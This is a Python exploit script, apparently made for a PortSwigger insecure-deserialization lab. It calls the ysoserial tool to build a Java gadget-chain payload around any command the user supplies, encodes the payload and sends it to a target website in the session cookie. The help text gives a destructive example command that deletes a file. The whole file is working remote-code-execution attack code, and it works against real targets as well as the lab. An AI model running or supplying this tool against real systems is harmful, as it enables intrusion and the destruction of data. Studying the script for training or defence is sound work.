#!/usr/bin/env python3

import requests
import subprocess
from re import search
from base64 import b64encode
from urllib.parse import quote
import argparse
import os

class exploit():
    def __init__(self, jarPath, payload, command):
        self.jarPath = jarPath
        self.payload = payload
        self.command = command

    def checkJavaVersion(self):
        print('[*] Checking Java version...')

        # Run command 'java --version'
        javaVersionOutput = subprocess.check_output(['java', '--version'])
        matchedResult = search(r'([0-9.]+)', str(javaVersionOutput))
        javaVersion = matchedResult.group(0)

        print(f'[*] Java version is: {javaVersion}')

        if int(javaVersion[:2]) >= 12:
            print('[-] This version doesn\'t work. Please switch to Java version <= 12. Example:')
            print('''┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/Insecure-Deserialization]
└─# export JAVA_HOME="/usr/lib/jvm/java-11-openjdk-amd64"

┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/Insecure-Deserialization]
└─# export PATH="${JAVA_HOME}/bin:{$PATH}"''')
            exit(0)
        else:
            print('[+] This version works!')

    def generatePayload(self):
        print('[*] Generating payload...')
        print(f'[*] Payload = {self.payload}, command = {self.command}')
        
        # Run command 'java -jar <ysoserial jar full path> <payload> <command>', and base64 encode it
        generatedPayload = b64encode(subprocess.check_output(['java', '-jar', self.jarPath, self.payload, self.command]))

        # Output the generated payload to disk
        print('[*] Writing the generated payload to disk for later use...')

        # Remove existed ysoserial_payload.b64 file
        if os.path.exists('ysoserial_payload.b64'):
            os.remove('ysoserial_payload.b64')

        for character in generatedPayload:
            with open('ysoserial_payload.b64', 'a') as file:
                file.write(chr(character))

        # URL encode the generated payload
        return quote(generatedPayload)

    def sendPayload(self, url, fullPayload):
        print('[*] Sending the payload...')

        payloadCookie = {
            'session': fullPayload
        }

        requests.get(url, cookies=payloadCookie)
        print('[+] Payload has been sent.')

def argumentParser():
    parser = argparse.ArgumentParser(description='A python script that generates and send ysoserial tool\'s payload, which is an Java serialized object gadget chains.')
    parser.add_argument('-j', '--jar', metavar='Path', help='The absolute path of the ysoserial Jar file. For example: /opt/ysoserial/ysoserial-all.jar', required=True)
    parser.add_argument('-p', '--payload', metavar='Payload', help='The ysoserial payload. For example: CommonsCollections4', required=True)
    parser.add_argument('-c', '--command', metavar='Command', help='The command you wanna execute. For example: \'rm /home/carlos/morale.txt\'', required=True)
    parser.add_argument('-u', '--url', metavar='Url', help='The full URL of the target website. For example: https://0a6d0005037e473ec06c22bc000300b7.web-security-academy.net/')

    return parser.parse_args()


def main():
    # Prepare arguments
    args = argumentParser()
    ysoserialJarPath = args.jar
    payload = args.payload
    command = args.command
    url = args.url     

    Exploit = exploit(ysoserialJarPath, payload, command)
    Exploit.checkJavaVersion()
    
    fullPayload = Exploit.generatePayload()

    while True:
        confirmInput = input('Do you want to send the payload to the target website? (y/n) ')

        if confirmInput.upper() == 'Y':
            Exploit.sendPayload(url, fullPayload)
            break
        elif confirmInput.upper() == 'N':
            print('[*] Bye!')
            break

if __name__ == '__main__':
    main()